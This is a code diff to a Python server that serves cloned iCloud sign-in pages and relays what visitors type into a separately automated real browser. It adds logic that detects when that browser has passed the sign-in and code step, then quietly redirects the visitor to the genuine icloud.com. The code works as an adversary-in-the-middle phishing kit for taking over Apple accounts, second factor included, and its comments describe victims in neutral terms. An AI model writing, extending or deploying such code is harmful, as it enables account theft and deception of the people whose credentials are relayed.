@@ -52,6 +52,11 @@ SRC = Path(os.environ.get("ICLOUD_SRC") or (HERE / "src")).resolve()
 # served, but this is the one it opens first.
 START_PAGE = "/src/1.html"
 
+# Where a person who has finished is sent: the place they came for. The
+# captures are closed to somebody who has already got in - there is nothing
+# left in them to do.
+ICLOUD = "https://www.icloud.com/"
+
 # The Sign In button on the icloud.com landing page. The browser still opens
 # and this is still clicked - the user signs in there themselves - but nothing
 # is captured from it any more.
@@ -760,6 +765,13 @@ async def captured(request: Request, path: str = ""):
     folder = SRC.resolve()
     path = path.lstrip("/")
 
+    # A person who has finished the process is sent to iCloud instead: the
+    # code was good, the browser is in, and there is nothing left in the
+    # captures for them to do.
+    finished = session_lookup(visitor_of(request))
+    if finished is not None and finished.hub.finished:
+        return RedirectResponse(ICLOUD, status_code=302)
+
     if not path:
         if folder.is_dir():
             return HTMLResponse(listing_page(folder))
@@ -830,6 +842,25 @@ def clean_page(value) -> str:
     return value
 
 
+def edit_go(page: str, field: str) -> str:
+    """Where a capture goes when a field on it is edited.
+
+    The flow says: editing the address on the password step takes the
+    capture back to the address, the way iCloud does it. Nothing else is
+    said, and nothing else moves.
+    """
+    for step in flow_steps():
+        if step.get("page") != page:
+            continue
+        edits = step.get("edits")
+        if not isinstance(edits, dict):
+            continue
+        go = clean_page(edits.get(field))
+        if go:
+            return go
+    return ""
+
+
 def came_from_a_capture(referrer) -> bool:
     """Was this document reached from another captured page?
 
@@ -882,6 +913,8 @@ class Hub:
         self.page = START_PAGE
         self.values: dict[str, dict] = {}
         self.browser: dict = {"url": "", "title": "", "fields": {}}
+        # Has this visitor finished? Then the captures are closed to them.
+        self.finished = False
 
     def snapshot(self) -> dict:
         # A copy: the message sits in a queue, and a navigation in the meantime
@@ -919,6 +952,11 @@ class Hub:
         page = clean_page(page)
         if not page or page == self.page:
             return False
+        if self.finished:
+            # The person has finished the process. There is nothing to go
+            # back to: the captures are closed to somebody who has already
+            # got in.
+            return False
         self.page = page
         # Form values belong to the page they were typed on.
         self.values = {}
@@ -926,6 +964,19 @@ class Hub:
         self.broadcast({"t": "nav", "page": page},
                        sender=None if everyone else sender)
         return True
+
+    def go_to_icloud(self) -> None:
+        """The person has finished: the app takes them to iCloud.
+
+        The code was good and the browser is in. Every viewer is sent there,
+        and the captures are closed to them from then on.
+        """
+        self.finished = True
+        self.page = ICLOUD
+        # Form values belong to the page they were typed on.
+        self.values = {}
+        log("going to icloud.com")
+        self.broadcast({"t": "nav", "page": ICLOUD})
 
     def handle(self, viewer: Viewer, message, session=None) -> None:
         if not isinstance(message, dict):
@@ -1004,6 +1055,36 @@ class Hub:
             if isinstance(tag, str) and isinstance(n, int) and isinstance(of, int):
                 spawn(write_at_to_browser(session, tag, n, of, value,
                                          cls if isinstance(cls, str) else ""))
+
+        elif kind == "edit":
+            # The person has changed a field on the capture. What that means
+            # is the flow's business: editing the address on the password
+            # step takes the capture back to the address, the way iCloud
+            # does it.
+            if session is None:
+                return
+
+            element = live.element_id(message.get("id"))
+            if not element:
+                return
+
+            page = message.get("page")
+            if not isinstance(page, str) or not page:
+                page = self.page
+
+            go = edit_go(page, element)
+            if not go:
+                return
+
+            log(f"flow: {page} {element} edited -> {go}")
+            # The browser keeps the new value: the field message that came
+            # with this one has already put it there. The password goes with
+            # it though - a password that went with an address is of no use
+            # now the address is a different one. That is what iCloud does.
+            spawn(write_to_browser(session, "password_text_field", ""))
+            # Everyone moves, including the viewer that edited: it did not
+            # follow a link, so nothing else would take it there.
+            self.navigate(go, sender=viewer, everyone=True)
 
         elif kind == "press":
             # A button pressed in a capture. What it does depends on where
@@ -1429,6 +1510,13 @@ async def poll_browser(session: "Session") -> None:
         except Exception:
             return
 
+    # Has the person finished? The code was good, the browser is in iCloud
+    # and the sign-in form is gone. Then the app takes them there, and the
+    # captures are closed to them: there is nothing left in them to do.
+    if not session.hub.finished and browser_is_signed_in(state):
+        session.hub.go_to_icloud()
+        return
+
     # Has the browser accepted what was typed into the capture? It has
     # when the control that was pressed is gone, or when the browser is
     # somewhere else - which is what the sign-in form turning into the
@@ -1439,6 +1527,20 @@ async def poll_browser(session: "Session") -> None:
         return
     session.hub.browser = state
     session.hub.broadcast({"t": "browser", **state})
+
+
+def browser_is_signed_in(state: dict) -> bool:
+    """Is the browser through the sign-in and into iCloud?
+
+    The code was good: the sign-in form is gone and the browser is on iCloud
+    itself. That is the end of the process, and the person is sent there.
+    """
+    url = str(state.get("url") or "").lower()
+    if "idmsa.apple.com" in url or "icloud.com" not in url:
+        return False
+    fields = state.get("fields") or {}
+    return not any(name in fields for name in
+                   ("account_name_text_field", "password_text_field"))
 
 
 def remember_me_is_off(state: dict) -> bool:
@@ -1498,6 +1600,12 @@ async def check_waiting(session: "Session", state: dict) -> None:
     step. Until then the capture stays where it is, and what the browser
     says about the details is shown on it.
     """
+    # The browser is in iCloud: the code was good and the process is over.
+    # There is no next capture to wait for.
+    if browser_is_signed_in(state):
+        session.hub.go_to_icloud()
+        return
+
     waiting = session.waiting
     if not waiting:
         return
